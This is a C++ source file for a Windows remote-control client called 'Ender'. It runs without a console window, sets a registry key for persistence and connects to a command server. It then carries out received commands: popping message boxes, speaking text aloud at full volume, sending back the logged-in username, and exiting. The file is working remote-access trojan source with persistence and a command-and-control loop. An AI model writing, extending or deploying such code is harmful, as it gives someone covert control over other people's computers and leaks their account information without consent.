#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>

#include <sapi.h>
#include "client.h"
#include "main.h"
#include "persistence.h"

#pragma comment (lib, "Ws2_32.lib")

typedef VOID(*SetHook)();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
{
	init_winsock();

	CLIENT client;

	if (!client.CheckRegKey())
	{
		client.SetRegKey();
	}
	client.connect_to_server();
	string command;
	while(true)
	{
		command.assign("");
		if(client.recieve_command(command) == false)
		{
			client.connect_to_server();
		}
		handle_command(client, command);
		Sleep(100);
	}
	return 0;
}

int init_winsock()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	return 0;
}

void handle_command(CLIENT& client, string& command)
{
	if(command.substr(0,5) == "show ")
	{
		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // client hangs when messagebox is displayed
	}
	else if(command == "disconnect")
	{
		ExitProcess(0);
	}
	else if(command == "username")
	{
		send_username(client);
	}
	else if(command.substr(0,6) == "speak ")
	{ 
		speak_command(command);
	}
}

void send_username(CLIENT& client) 
{
	char *uname = new char[500];
	DWORD user_len = 500;
	GetUserNameA(uname, &user_len);
	string resp;
	resp.assign(uname);
	client.send_response(resp);
	delete[] uname;
}

void speak_command(string& command)
{
	ISpVoice * pVoice = NULL;
	CoInitialize(NULL);
	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
	const char* to_speak_char = command.c_str() + 6;
	wchar_t* to_speak_unicode = new wchar_t[command.length()];
	MultiByteToWideChar(CP_UTF8, 0, to_speak_char, -1, to_speak_unicode, command.length());
	pVoice->SetVolume(100);
	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
	pVoice->Release();
	CoUninitialize();
}